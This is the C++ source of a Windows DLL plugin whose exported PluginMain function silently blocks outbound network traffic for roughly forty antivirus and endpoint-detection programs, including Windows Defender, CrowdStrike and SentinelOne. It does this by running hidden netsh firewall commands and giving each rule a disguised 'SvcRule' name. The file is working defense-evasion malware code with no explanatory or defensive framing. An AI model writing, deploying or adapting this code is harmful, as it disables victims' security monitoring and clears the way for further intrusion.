#define WIN32_LEAN_AND_MEAN
#include <windows.h>

static BOOL _Exec(wchar_t* cmd){
    STARTUPINFOW si={};PROCESS_INFORMATION pi={};si.cb=sizeof(si);
    BOOL r=CreateProcessW(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(r){WaitForSingleObject(pi.hProcess,10000);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    return r;
}

static void _AddRule(const wchar_t* sys, const wchar_t* envPath, int idx){
    wchar_t exe[MAX_PATH]={};
    ExpandEnvironmentStringsW(envPath,exe,MAX_PATH);
    if(GetFileAttributesW(exe)==INVALID_FILE_ATTRIBUTES)return;
    SYSTEMTIME st={};GetLocalTime(&st);
    wchar_t name[48]={};
    wsprintfW(name,L"SvcRule%04d%02d%02d%04d%d",st.wYear,st.wMonth,st.wDay,GetTickCount()%10000,idx);
    wchar_t cmd[2048]={};
    wsprintfW(cmd,L"%s\\netsh.exe advfirewall firewall add rule name=\"%s\" dir=out action=block program=\"%s\" enable=yes",sys,name,exe);
    _Exec(cmd);
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    wchar_t sys[MAX_PATH]={};
    GetSystemDirectoryW(sys,MAX_PATH);

    const wchar_t* targets[]={
        L"%ProgramFiles%\\Windows Defender\\MsMpEng.exe",
        L"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe",
        L"%ProgramFiles%\\Windows Defender\\NisSrv.exe",
        L"%ProgramFiles%\\Windows Defender\\MsMpLics.exe",
        L"%ProgramFiles%\\Windows Defender\\MpDefenderCoreService.exe",
        L"%ProgramFiles%\\Avast Software\\Avast\\AvastSvc.exe",
        L"%ProgramFiles%\\AVAST Software\\Avast\\AvastUI.exe",
        L"%ProgramFiles(x86)%\\Avast Software\\Avast\\AvastSvc.exe",
        L"%ProgramFiles%\\AVG\\Antivirus\\AVGSvc.exe",
        L"%ProgramFiles(x86)%\\AVG\\Antivirus\\AVGSvc.exe",
        L"%ProgramFiles%\\Bitdefender\\Bitdefender Security\\bdagent.exe",
        L"%ProgramFiles%\\ESET\\ESET Security\\ekrn.exe",
        L"%ProgramFiles%\\Kaspersky Lab\\Kaspersky\\avp.exe",
        L"%ProgramFiles%\\Malwarebytes\\Anti-Malware\\MBAMService.exe",
        L"%ProgramFiles%\\Sophos\\Sophos Anti-Virus\\SavService.exe",
        L"%ProgramFiles%\\McAfee\\MSC\\McShield.exe",
        L"%ProgramFiles%\\Norton\\Norton Security\\NortonSecurity.exe",
        L"%ProgramFiles%\\F-Secure\\fmon.exe",
        L"%ProgramFiles%\\SentinelOne\\Sentinel Agent\\SentinelAgent.exe",
        L"%ProgramFiles%\\SentinelOne\\Sentinel Agent\\SentinelServiceHost.exe",
        L"%ProgramFiles%\\SentinelOne\\Sentinel Agent\\SentinelStaticEngine.exe",
        L"%ProgramFiles%\\CrowdStrike\\CSFalconService\\CSFalconService.exe",
        L"%ProgramFiles%\\Panda Security\\Panda Dome\\PandaAVEngine.exe",
        L"%ProgramFiles%\\WatchGuard\\WGES\\PSANHost.exe",
        L"%ProgramFiles(x86)%\\Trend Micro\\OfficeScan Client\\TmListen.exe",
        L"%ProgramFiles%\\Trend Micro\\Apex One\\PCCSRV\\Ntrtscan.exe",
        L"%ProgramFiles%\\Trend Micro\\Client Server Security Agent\\TmListen.exe",
        L"%ProgramFiles%\\Symantec\\Symantec Endpoint Protection\\Smc.exe",
        L"%ProgramFiles(x86)%\\Symantec\\Symantec Endpoint Protection\\Smc.exe",
        L"%ProgramFiles%\\Broadcom\\Symantec Endpoint Protection\\Smc.exe",
        L"%ProgramFiles%\\VMware\\VMware Carbon Black\\RepMgr.exe",
        L"%ProgramFiles%\\Confer\\RepMgr64.exe",
        L"%ProgramFiles%\\Cylance\\Desktop\\CylanceSvc.exe",
        L"%ProgramFiles%\\Webroot\\WRSA.exe",
        L"%ProgramFiles(x86)%\\Webroot\\WRSA.exe",
        L"%ProgramFiles%\\COMODO\\COMODO Internet Security\\cmdagent.exe",
        L"%ProgramFiles%\\Emsisoft Anti-Malware\\a2service.exe",
        L"%ProgramFiles(x86)%\\G Data\\G DATA AntiVirus\\AVKWCtl.exe",
        L"%ProgramFiles%\\Trellix\\ENS\\Threat Prevention\\mfemactl.exe",
        L"%ProgramFiles%\\VIPRE\\SBAMSvc.exe",
        L"%ProgramFiles%\\Panda Security\\WaAgent\\WaAgent.exe",
        L"%ProgramFiles%\\McAfee\\Endpoint Security\\Threat Prevention\\mfemactl.exe",
    };
    DWORD n=sizeof(targets)/sizeof(targets[0]);
    for(DWORD i=0;i<n;i++)_AddRule(sys,targets[i],(int)i);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){(void)h;(void)r;(void)l;return TRUE;}
